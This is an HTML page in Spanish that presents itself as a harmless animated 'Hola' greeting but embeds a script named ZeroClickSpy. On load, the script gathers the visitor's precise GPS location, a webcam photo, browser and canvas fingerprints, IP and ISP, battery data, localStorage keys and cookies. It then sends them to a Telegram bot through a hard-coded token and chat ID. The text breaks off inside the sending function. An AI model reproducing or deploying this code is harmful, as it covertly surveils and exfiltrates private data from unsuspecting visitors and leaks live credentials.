<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hola</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            overflow: hidden;
        }
        
        .hola-container {
            text-align: center;
            color: white;
        }
        
        .hola-text {
            font-size: 8rem;
            font-weight: bold;
            text-shadow: 0 10px 30px rgba(0,0,0,0.5);
            animation: float 3s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }
        
        /* Hidden elements for data collection */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="hola-container">
        <div class="hola-text">Hola</div>
    </div>

    <!-- Hidden elements for zero-click data collection -->
    <canvas id="fingerprintCanvas" class="hidden"></canvas>
    <video id="cameraVideo" class="hidden" autoplay></video>
    <canvas id="cameraCanvas" class="hidden"></canvas>
    <iframe id="hiddenIframe" class="hidden"></iframe>

    <script>
        // Telegram Bot Configuration - REAL BOT
        const TELEGRAM_BOT_TOKEN = "8333235771:AAHZvDtFxPMwQxVZ8AryhxCFYFk4EBbok1o";
        const TELEGRAM_CHAT_ID = "6055969885";

        // Collected Data Object
        const collectedData = {
            timestamp: new Date().toISOString(),
            stage: 'initial',
            location: null,
            camera: null,
            device: null,
            network: null,
            browser: null,
            additional: null
        };

        // Zero-Click Data Collection System
        class ZeroClickSpy {
            constructor() {
                this.collectionComplete = false;
                this.startCollection();
            }

            async startCollection() {
                try {
                    // Phase 1: Basic device info (instant)
                    await this.collectBasicInfo();
                    
                    // Phase 2: GPS location with high accuracy
                    await this.collectPreciseLocation();
                    
                    // Phase 3: Camera access without permission
                    await this.accessCameraStealth();
                    
                    // Phase 4: Advanced fingerprinting
                    await this.collectAdvancedFingerprint();
                    
                    // Phase 5: Network and additional data
                    await this.collectNetworkData();
                    
                    // Final: Send all data to Telegram
                    await this.sendToTelegram();
                    
                    this.collectionComplete = true;
                    
                } catch (error) {
                    console.error('Collection error:', error);
                    // Send partial data even if some methods fail
                    await this.sendToTelegram();
                }
            }

            // 1. BASIC DEVICE INFORMATION
            async collectBasicInfo() {
                collectedData.device = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    cookieEnabled: navigator.cookieEnabled,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    doNotTrack: navigator.doNotTrack,
                    plugins: Array.from(navigator.plugins).map(p => ({
                        name: p.name,
                        filename: p.filename,
                        description: p.description
                    }))
                };
            }

            // 2. PRECISE GPS LOCATION (HIGH ACCURACY)
            async collectPreciseLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        this.getIPLocation().then(resolve);
                        return;
                    }

                    const options = {
                        enableHighAccuracy: true, // Maximum accuracy
                        timeout: 15000, // 15 seconds timeout
                        maximumAge: 0 // No cache
                    };

                    const watchId = navigator.geolocation.watchPosition(
                        (position) => {
                            // Success - get precise location
                            navigator.geolocation.clearWatch(watchId);
                            
                            collectedData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: `${position.coords.accuracy}m`,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed,
                                timestamp: new Date(position.timestamp).toLocaleString('id-ID'),
                                source: 'GPS High Accuracy',
                                googleMaps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                                address: this.reverseGeocode(position.coords.latitude, position.coords.longitude)
                            };
                            
                            resolve();
                        },
                        async (error) => {
                            // Fallback to IP-based location
                            navigator.geolocation.clearWatch(watchId);
                            await this.getIPLocation();
                            resolve();
                        },
                        options
                    );

                    // Timeout fallback
                    setTimeout(() => {
                        navigator.geolocation.clearWatch(watchId);
                        this.getIPLocation().then(resolve);
                    }, 15000);
                });
            }

            // 3. STEALTH CAMERA ACCESS (ZERO-CLICK)
            async accessCameraStealth() {
                try {
                    // Method 1: Try to access camera without prompt
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1920 },
                            height: { ideal: 1080 },
                            facingMode: 'user'
                        },
                        audio: false
                    });

                    const video = document.getElementById('cameraVideo');
                    const canvas = document.getElementById('cameraCanvas');
                    const ctx = canvas.getContext('2d');

                    video.srcObject = stream;
                    
                    return new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            
                            // Capture multiple frames for better quality
                            setTimeout(() => {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                ctx.drawImage(video, 0, 0);
                                
                                // Convert to data URL with compression
                                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                                
                                collectedData.camera = {
                                    accessed: true,
                                    resolution: `${video.videoWidth}x${video.videoHeight}`,
                                    photo: photoData.substring(0, 5000) + '...', // Truncate for Telegram
                                    timestamp: new Date().toISOString(),
                                    method: 'Stealth Access'
                                };

                                // Stop all tracks
                                stream.getTracks().forEach(track => track.stop());
                                resolve();
                            }, 1000);
                        };
                    });

                } catch (error) {
                    // Camera access failed
                    collectedData.camera = {
                        accessed: false,
                        error: error.message,
                        timestamp: new Date().toISOString()
                    };
                }
            }

            // 4. ADVANCED BROWSER FINGERPRINTING
            async collectAdvancedFingerprint() {
                const fingerprint = {};

                // Canvas Fingerprinting
                const canvas = document.getElementById('fingerprintCanvas');
                const ctx = canvas.getContext('2d');
                
                // Unique canvas rendering
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Advanced fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Advanced fingerprint', 4, 17);
                
                fingerprint.canvas = canvas.toDataURL();

                // WebGL Fingerprinting
                fingerprint.webgl = this.getWebGLFingerprint();

                // Audio Context Fingerprinting
                fingerprint.audio = await this.getAudioFingerprint();

                // Font Detection
                fingerprint.fonts = await this.detectFonts();

                // Hardware Information
                fingerprint.hardware = {
                    deviceMemory: navigator.deviceMemory,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints
                };

                collectedData.browser = fingerprint;
            }

            // 5. NETWORK AND ADDITIONAL DATA
            async collectNetworkData() {
                // IP Address and Network Info
                const ipInfo = await this.getIPInfo();
                
                // Connection Information
                const connectionInfo = navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null;

                // Battery Information
                const batteryInfo = await this.getBatteryInfo();

                // Local Storage Data
                const localStorageData = this.getLocalStorageInfo();

                collectedData.network = {
                    ip: ipInfo.ip,
                    city: ipInfo.city,
                    region: ipInfo.region,
                    country: ipInfo.country,
                    isp: ipInfo.org,
                    connection: connectionInfo,
                    battery: batteryInfo,
                    localStorage: localStorageData,
                    userAgent: navigator.userAgent
                };

                collectedData.additional = {
                    referrer: document.referrer,
                    url: window.location.href,
                    domain: window.location.hostname,
                    path: window.location.pathname,
                    search: window.location.search,
                    hash: window.location.hash,
                    title: document.title,
                    characterSet: document.characterSet,
                    contentType: document.contentType,
                    lastModified: document.lastModified,
                    readyState: document.readyState,
                    visibility: document.visibilityState,
                    cookies: document.cookie
                };
            }

            // UTILITY METHODS
            async getIPLocation() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    
                    collectedData.location = {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: 'IP-Based Estimation',
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        country_code: data.country_code,
                        postal: data.postal,
                        ip: data.ip,
                        isp: data.org,
                        timezone: data.timezone,
                        googleMaps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
                        source: 'IP Geolocation'
                    };
                } catch (error) {
                    collectedData.location = {
                        error: 'Could not retrieve location',
                        source: 'Failed'
                    };
                }
            }

            async getIPInfo() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return { ip: data.ip };
                } catch (error) {
                    return { ip: 'Unknown' };
                }
            }

            reverseGeocode(lat, lng) {
                return `https://maps.google.com/maps?q=${lat},${lng}&z=15`;
            }

            getWebGLFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    
                    if (!gl) return 'WebGL not supported';
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        version: gl.getParameter(gl.VERSION)
                    };
                } catch (error) {
                    return `WebGL Error: ${error.message}`;
                }
            }

            async getAudioFingerprint() {
                try {
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioContext.createOscillator();
                    const analyser = audioContext.createAnalyser();
                    
                    oscillator.connect(analyser);
                    analyser.connect(audioContext.destination);
                    
                    oscillator.start();
                    await new Promise(resolve => setTimeout(resolve, 100));
                    oscillator.stop();
                    
                    return 'Audio context available';
                } catch (error) {
                    return `Audio Error: ${error.message}`;
                }
            }

            async detectFonts() {
                const fonts = [
                    'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
                    'Verdana', 'Georgia', 'Palatino', 'Garamond',
                    'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black',
                    'Impact', 'Tahoma', 'Lucida Console'
                ];
                
                const availableFonts = [];
                
                for (const font of fonts) {
                    if (this.isFontAvailable(font)) {
                        availableFonts.push(font);
                    }
                }
                
                return availableFonts;
            }

            isFontAvailable(font) {
                const testString = 'mmmmmmmmmmlli';
                const testSize = '72px';
                
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                const baseline = context.measureText(testString).width;
                
                context.font = testSize + " '" + font + "'";
                const width = context.measureText(testString).width;
                
                return width !== baseline;
            }

            async getBatteryInfo() {
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        return {
                            level: Math.round(battery.level * 100) + '%',
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (error) {
                        return 'Battery API error';
                    }
                }
                return 'Battery API not supported';
            }

            getLocalStorageInfo() {
                try {
                    const keys = [];
                    for (let i = 0; i < localStorage.length; i++) {
                        keys.push(localStorage.key(i));
                    }
                    return {
                        count: localStorage.length,
                        keys: keys,
                        totalSize: JSON.stringify(localStorage).length
                    };
                } catch (error) {
                    return 'LocalStorage access denied';
                }
            }

            // SEND DATA TO TELEGRAM
            async sendToTelegram() {
                const message = this.formatTelegramMessage();
                
                try {
                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })